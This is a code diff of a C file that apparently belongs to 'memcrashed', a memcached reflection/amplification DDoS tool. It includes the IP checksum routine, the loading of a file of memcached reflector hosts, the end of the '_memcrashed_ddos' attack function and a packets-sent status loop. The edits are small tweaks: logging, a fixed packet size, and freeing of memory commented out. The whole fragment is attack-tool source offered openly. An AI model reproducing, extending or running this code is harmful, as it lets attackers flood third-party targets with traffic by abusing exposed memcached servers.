@@ -22,15 +22,15 @@
 #define iphdr ip
 #endif
 
+#define DEBUG
 
-uint64_t MAX_PSIZE;
+#define MAX_PSIZE 4096
 slist* _hosts;
 unsigned short csum (unsigned short *buf, int nwords)
 {
     unsigned long sum = 0;
-    for (sum = 0; nwords > 0; nwords--){
+    for (sum = 0; nwords > 0; nwords--)
         sum += *buf++;
-    }
     sum = (sum >> 16) + (sum & 0xffff);
     sum += (sum >> 16);
     return (unsigned short)(~sum);
@@ -131,21 +131,20 @@ void _memcrashed_ddos(char *target,int port,slist *hosts){
             sleep_ms(dos_sleep);
         }
     }
-    free(target);
-    free_slist(hosts);
-    free(iph);
-    free(udph);
+    //free(target);
+    //free_slist(hosts);
 }
-void memcrashed_init(char* hostfile){
+void memcrashed_init(const char* hostfile){
     FILE* fp=fopen(hostfile, "r");
     if(!fp){
-        die("Failed to open file:%s(%d)",strerror(errno),errno);
+        die("Failed to open file:%s:%s(%d)",hostfile,strerror(errno),errno);
     }
     _hosts=create_slist();
     char *line = NULL;
     size_t len = 0;
     ssize_t read;
     while ((read = getline(&line, &len, fp)) != -1) {
+        info("Adding ip:%s",line);
         add_slist(_hosts, line);
     }
     if(line){
@@ -165,10 +164,9 @@ void memcrashed_status(){
     const char * metrics_str=metrics2str(metrics);
     for (;;) {
         if (!__run) {
-            
             break;
         }
-        success_n("Total packets sent to memcached servers:%.2f%s",psent,metrics_str);
+        success_n("Total packets sent to memcached servers:%.2f%s\r",psent,metrics_str);
         psent+=MAX_PSIZE/pow(1024.0,metrics);
     }
 }
